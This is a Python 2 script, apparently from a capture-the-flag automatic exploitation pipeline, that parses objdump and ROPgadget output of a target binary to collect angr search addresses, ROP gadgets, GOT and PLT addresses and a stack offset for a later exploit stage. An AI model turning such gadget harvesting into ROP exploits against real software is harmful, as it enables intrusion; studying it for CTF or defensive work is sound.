import commands
def do_command(cmd_line):
	(status, output) = commands.getstatusoutput(cmd_line)
	return output

def get_mid_str(data, b_str, e_str, s_pos = 0):
	b_pos = data.find(b_str, s_pos)
	if b_pos == -1:
		return ""
	b_pos += len(b_str)
	e_pos = data.find(e_str, b_pos)

	data = data[b_pos:e_pos]
	#print s_pos, b_pos, e_pos
	#print data
	while b_str in data:
		data = data[data.find(b_str)+len(b_str):]
		#print data
	return data

def write_file(filename, data, mode = "wb"):
	file_w = open(filename, mode)
	file_w.write(data)
	file_w.close()

def do_angr_conf():
	tmp_file_asm = do_command("objdump -d tmp_file.bin")

	b_pos = tmp_file_asm.find("<__libc_start_main@plt>\n")

	main_addr = get_mid_str(tmp_file_asm, " 	mov    $0x", ",%rdi\n", b_pos - 0x80)
	#print main_addr
	b_pos = tmp_file_asm.find("%s:"%main_addr)
	b_pos = tmp_file_asm.find(" <atoi@plt>\n", b_pos)
	deal_func_addr = get_mid_str(tmp_file_asm, "callq  ", " <", b_pos)
	print "start_addr =>", deal_func_addr

	b_pos = tmp_file_asm.find("%s:"%deal_func_addr)
	s_b_pos = tmp_file_asm.find("	callq  ", b_pos - 0x100)
	success = get_mid_str(tmp_file_asm, "$0x1,%eax\n  ", ":	", s_b_pos - 0x80)
	print "success =>", success
	f_b_pos = tmp_file_asm.find("leave", b_pos)
	fail = get_mid_str(tmp_file_asm, "$0x0,%eax\n  ", ":	", f_b_pos - 0x80)
	print "fail =>", fail

	data_write = ""
	data_write += deal_func_addr + "\n"
	data_write += success + "\n"
	data_write += fail + "\n"

	write_file("angr_deal.conf", data_write)

def do_pwn_conf():
	rop_asm = do_command("ROPgadget  --binary tmp_file.bin")

	rop_map = {}
	rop_map["p_rdi_ret"] = "pop rdi ; ret"
	rop_map["p_rsi_r15_ret"] = "pop rsi ; pop r15 ; ret"
	rop_map["ret_addr"] = "ret"
	rop_map["p_rbp_ret"] = "pop rbp ; ret"
	rop_map["set_args_addr"] = "pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret"

	rop_map_val = {}

	mov_edx_rbp_p_rbp_ret = 0

	for line in rop_asm.split("\n"):
		items = line.split(" : ")
		if len(items) != 2:
			continue

		for key in rop_map.keys():
			if key not in rop_map_val.keys():
				if items[1] == rop_map[key]:
					rop_map_val[key] = int(items[0], 16)

		if items[1].startswith("pop rbp ; mov byte ptr [rip + ") and items[1].endswith("], 1 ; ret"):
			mov_edx_rbp_p_rbp_ret = int(items[0], 16) - 10


	got_data = do_command("objdump -R tmp_file.bin")
	alarm_got = 0

	for line in got_data.split("\n"):
		items = line.split(" ")
		if len(items) < 3:
			continue
		got_name = items[-1].split("@")[0]
		if got_name == "alarm":
			alarm_got = int(items[0], 16)

	tmp_file_asm = do_command("objdump -d tmp_file.bin")
	b_pos = tmp_file_asm.find(" <read@plt>:\n")
	read_plt = get_mid_str(tmp_file_asm, "\n", " <read@plt>:\n", b_pos - 0x18)
	read_plt = int(read_plt, 16)
	b_pos = tmp_file_asm.find(" <atoi@plt>:\n")
	atoi_plt = get_mid_str(tmp_file_asm, "\n", " <atoi@plt>:\n", b_pos - 0x18)
	atoi_plt = int(atoi_plt, 16)

	b_pos = tmp_file_asm.find(" <read@plt>\n")
	#print tmp_file_asm[b_pos-0x100:b_pos+0x10]
	rbp_val = get_mid_str(tmp_file_asm, "	lea ", "(%rbp),%rax", b_pos - 0x100)
	#print rbp_val
	rbp_val = int(rbp_val.strip(), 16)
	print "rbp:", hex(rbp_val)

	data_write = ""
	data_write += "0x%x\n"%rop_map_val["p_rdi_ret"]
	data_write += "0x%x\n"%rop_map_val["p_rsi_r15_ret"]
	data_write += "0x%x\n"%rop_map_val["ret_addr"]
	data_write += "0x%x\n"%rop_map_val["p_rbp_ret"]
	data_write += "0x%x\n"%mov_edx_rbp_p_rbp_ret
	data_write += "0x%x\n"%(rop_map_val["set_args_addr"] - 1)
	data_write += "0x%x\n"%(rop_map_val["set_args_addr"] - 1 - 0x1a)
	data_write += "0x%x\n"%alarm_got
	data_write += "0x%x\n"%read_plt
	data_write += "0x%x\n"%atoi_plt
	data_write += "%s\n"%hex(rbp_val).replace("L", "").replace("l", "")


	write_file("do_pwn_next.conf", data_write)
 


def do_work():
	do_angr_conf()
	do_pwn_conf()


do_work()
